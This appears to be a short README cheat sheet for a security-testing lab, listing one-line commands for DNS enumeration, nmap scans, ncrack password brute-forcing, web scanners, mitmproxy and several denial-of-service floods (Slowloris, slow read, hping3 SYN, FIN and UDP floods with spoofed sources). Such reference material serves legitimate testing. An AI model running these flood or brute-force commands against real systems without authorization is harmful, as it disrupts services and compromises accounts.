# Security Testing

## Summary

This document is a high level introduction to some security testing tools that are commonly available in the linux ecosystem.

## Vagrant Environment

1. [Ansible (2.4.3.0)](https://www.ansible.com/)
2. [Vagrant (2.2.6)](https://www.vagrantup.com/)
3. [VirtualBox (6.0.16 r135674)](https://www.virtualbox.org/)

## Attack Vectors

### Network

#### Domain Name Discovery

##### dnsmap

```
dnsmap <domain.com> -d 1 -w <dictionary> -r dnsmap-$(date +%F).log
```

##### DNSRecon

```
dnsrecon -d example.com -D <dictionary> -t std --xml $(pwd)/dnsrecon.xml
```

#### Authentication

```
ncrack -p <port> --user <username> -P <dictionary> <xxx.xxx.xxx.xxx>
```

#### Port Scan

##### TCP

```
nmap -Pn -p- <xxx.xxx.xxx.xxx>
```

##### UDP

```
nmap -Pn -sU -F <xxx.xxx.xxx.xxx>
```

### DOS

#### Slowloris

```
slowhttptest -c 65539 -H -g -o $(date +%F) -i 10 -r 200 -t GET -u http://some.domain.com/ -x 24 -p 3
```

#### Slow Read

```
slowhttptest -g -o $(date +%F) -c 65539 -X -r 1000 -w 10 -y 20 -n 5 -z 32 -u http://some.domain.com/ -p 5 -l 350
```

#### TCP SYN Flood

```
sudo hping3 --rand-source <xxx.xxx.xxx.xxx> --flood -S -L 0 -p <port>
```

#### TCP FIN Flood

```
sudo hping3 --flood --rand-source -F -p <port> <xxx.xxx.xxx.xxx>
```

#### UDP Flood

```
sudo hping3 --flood --rand-source --udp -p <port> <xxx.xxx.xxx.xxx>
```

#### Apache Bench

```
ab -c 1000 -n 10000 http://xxx.xxx.xxx.xxx/
```

#### DNS Flood

##### DIG

```
dig @<xxx.xxx.xxx.xxx> some.domain.com
```

##### NetStress

```
netstress -m -f <xxx.xxx.xxx.xxx>
```

#### Man In The Middle

```
mitmproxy -R https://some.domain.com:<port>/
```

### Security Reconnaissance

#### Arachni

```
sudo OPENSSL_CONF=/etc/ssl/ /usr/lib/arachni-2.0dev-1.0dev/bin/arachni "http://some.domain.com"  --report-save-path ./$(date +%F).afr --plugin=metrics
```

```
sudo /usr/lib/arachni-2.0dev-1.0dev/bin/arachni_reporter --reporter=html:outfile=$(date +%F).html.zip ./$(date +%F).afr
```

#### Skipfish

```
skipfish -o $(date +%F).log http://some.domain.com
```

#### HTCAP

```
htcap crawl -v 'http://some.domain.com/' $(date +%F).db
```

#### Wapiti

```
wapiti 'http://some.domain.com/'  --output  $(date +%F)
```
